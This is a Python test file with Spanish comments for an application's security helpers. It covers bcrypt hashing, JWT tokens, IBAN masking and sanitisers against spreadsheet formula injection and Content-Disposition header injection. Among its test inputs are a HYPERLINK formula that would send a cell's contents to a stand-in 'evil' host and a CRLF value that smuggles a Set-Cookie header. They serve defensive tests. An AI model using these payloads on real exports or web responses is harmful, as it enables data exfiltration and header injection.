"""Tests para app.core.security — hashing, tokens JWT."""
from datetime import timedelta

from app.core.security import (
    create_access_token,
    create_refresh_token,
    decode_token,
    get_password_hash,
    mask_iban,
    safe_content_disposition_filename,
    sanitize_spreadsheet_cell,
    verify_password,
)


class TestPasswordHashing:
    def test_hash_and_verify(self):
        password = "MiContraseña_Segura!123"
        hashed = get_password_hash(password)
        assert hashed != password
        assert verify_password(password, hashed)

    def test_wrong_password_fails(self):
        hashed = get_password_hash("correcta")
        assert not verify_password("incorrecta", hashed)

    def test_different_hashes_for_same_password(self):
        """bcrypt genera salt aleatorio → hashes distintos."""
        h1 = get_password_hash("misma")
        h2 = get_password_hash("misma")
        assert h1 != h2

    def test_empty_password(self):
        hashed = get_password_hash("")
        assert verify_password("", hashed)
        assert not verify_password("algo", hashed)

    def test_unicode_password(self):
        password = "contraseña_con_ñ_y_€"
        hashed = get_password_hash(password)
        assert verify_password(password, hashed)


class TestAccessToken:
    def test_create_and_decode(self):
        data = {"sub": "user-123", "tenant_id": "tenant-456", "role": "admin"}
        token = create_access_token(data)
        decoded = decode_token(token)
        assert decoded is not None
        assert decoded["sub"] == "user-123"
        assert decoded["tenant_id"] == "tenant-456"
        assert decoded["role"] == "admin"
        assert decoded["type"] == "access"

    def test_custom_expiry(self):
        data = {"sub": "user-1"}
        token = create_access_token(data, expires_delta=timedelta(minutes=5))
        decoded = decode_token(token)
        assert decoded is not None
        assert decoded["sub"] == "user-1"

    def test_expired_token_returns_none(self):
        data = {"sub": "user-1"}
        token = create_access_token(data, expires_delta=timedelta(seconds=-1))
        assert decode_token(token) is None

    def test_invalid_token_returns_none(self):
        assert decode_token("esto.no.es.un.token.valido") is None
        assert decode_token("") is None
        assert decode_token("abc123") is None


class TestRefreshToken:
    def test_create_and_decode(self):
        data = {"sub": "user-1", "tenant_id": "t-1", "role": "user"}
        token = create_refresh_token(data)
        decoded = decode_token(token)
        assert decoded is not None
        assert decoded["type"] == "refresh"
        assert decoded["sub"] == "user-1"

    def test_refresh_token_differs_from_access(self):
        data = {"sub": "user-1", "tenant_id": "t-1", "role": "admin"}
        access = create_access_token(data)
        refresh = create_refresh_token(data)
        assert access != refresh


class TestMaskIban:
    def test_iban_sin_espacios(self):
        result = mask_iban("ES9121000418450200051332")
        assert result == "ES** **** **** **** **** 1332"

    def test_iban_con_espacios(self):
        result = mask_iban("ES91 2100 0418 4502 0005 1332")
        assert result == "ES** **** **** **** **** 1332"

    def test_iban_dentro_de_texto(self):
        result = mask_iban("Transferencia a ES91 2100 0418 4502 0005 1332 recibida.")
        assert result == "Transferencia a ES** **** **** **** **** 1332 recibida."

    def test_iban_minusculas_normaliza_pais(self):
        result = mask_iban("es9121000418450200051332")
        assert result == "ES** **** **** **** **** 1332"

    def test_no_es_iban_no_toca(self):
        # Texto sin IBANs queda intacto
        assert mask_iban("Hola mundo, sin números aquí.") == "Hola mundo, sin números aquí."

    def test_string_corto_no_se_toca(self):
        # ES12 sin más no es IBAN, no debe enmascararse
        assert mask_iban("ES12") == "ES12"

    def test_idempotente_no_re_enmascara(self):
        masked_once = mask_iban("ES9121000418450200051332")
        masked_twice = mask_iban(masked_once)
        assert masked_once == masked_twice

    def test_iban_pais_diferente(self):
        # DE89 3704 0044 0532 0130 00 (22 chars de body para DE = 22+2+2 = no, DE es 22 total)
        # DE IBAN tiene 22 chars total: DE + 2 check + 18 body
        result = mask_iban("DE89370400440532013000")
        # 22 chars: middle_groups = (22-6)//4 = 4
        assert result == "DE** **** **** **** **** 3000"

    def test_input_none_devuelve_none(self):
        assert mask_iban(None) is None

    def test_input_vacio(self):
        assert mask_iban("") == ""

    def test_multiples_ibans_en_texto(self):
        text = "De ES9121000418450200051332 a ES7600810001234567890123 transfer."
        result = mask_iban(text)
        assert "ES** **** **** **** **** 1332" in result
        assert "ES** **** **** **** **** 0123" in result


class TestSanitizeSpreadsheetCell:
    """Anti CSV/Excel formula injection (sanitize_spreadsheet_cell)."""

    def test_formula_igual_prefijada(self):
        assert sanitize_spreadsheet_cell("=1+1") == "'=1+1"

    def test_hyperlink_exfil_prefijado(self):
        payload = '=HYPERLINK("http://evil/?"&A1,"x")'
        assert sanitize_spreadsheet_cell(payload) == "'" + payload

    def test_todos_los_triggers(self):
        for ch in ("=", "+", "-", "@", "\t", "\r"):
            assert sanitize_spreadsheet_cell(ch + "cmd") == "'" + ch + "cmd"

    def test_texto_normal_intacto(self):
        assert sanitize_spreadsheet_cell("Acme SL") == "Acme SL"

    def test_no_str_intacto(self):
        assert sanitize_spreadsheet_cell(42) == 42
        assert sanitize_spreadsheet_cell(None) is None

    def test_str_vacio_intacto(self):
        assert sanitize_spreadsheet_cell("") == ""

    def test_writer_escribe_celda_saneada(self):
        """End-to-end: el writer central escribe la celda ya prefijada."""
        import os
        import tempfile

        import openpyxl
        import pandas as pd

        from app.agents.excel._writer import _write_excel

        df = pd.DataFrame({"Cliente": ["=1+1", "Acme SL"]})
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "out.xlsx")
            _write_excel({"Hoja": df}, path)
            wb = openpyxl.load_workbook(path)
            ws = wb["Hoja"]
            assert ws.cell(row=2, column=1).value == "'=1+1"  # saneada
            assert ws.cell(row=3, column=1).value == "Acme SL"  # intacta


class TestSafeContentDispositionFilename:
    """Anti header-injection en Content-Disposition (safe_content_disposition_filename)."""

    def test_nombre_normal_no_cambia(self):
        # Un nombre limpio debe pasar intacto (no debe cambiar filenames existentes).
        assert safe_content_disposition_filename("Acme SL") == "Acme SL"

    def test_acentos_y_unicode_se_conservan(self):
        # Solo se eliminan control/comillas/backslash; los acentos son legítimos.
        assert safe_content_disposition_filename("José Núñez") == "José Núñez"

    def test_crlf_header_injection_neutralizado(self):
        out = safe_content_disposition_filename('x"\r\nSet-Cookie: a=b')
        assert "\r" not in out
        assert "\n" not in out
        assert '"' not in out
        assert "\\" not in out
        # El texto legible sobrevive, solo se quitan los caracteres peligrosos.
        assert "Set-Cookie: a=b" in out

    def test_backslash_y_control_chars_eliminados(self):
        out = safe_content_disposition_filename("a\\b\x00c\x1fd\x7fe")
        assert out == "abcde"

    def test_vacio_usa_fallback_por_defecto(self):
        assert safe_content_disposition_filename("") == "download"

    def test_none_usa_fallback_por_defecto(self):
        assert safe_content_disposition_filename(None) == "download"

    def test_fallback_personalizado(self):
        assert safe_content_disposition_filename(None, "contrato") == "contrato"

    def test_solo_caracteres_peligrosos_cae_a_fallback(self):
        # Si tras sanear no queda nada, se usa el fallback en vez de "".
        assert safe_content_disposition_filename('"\r\n', "empleado") == "empleado"
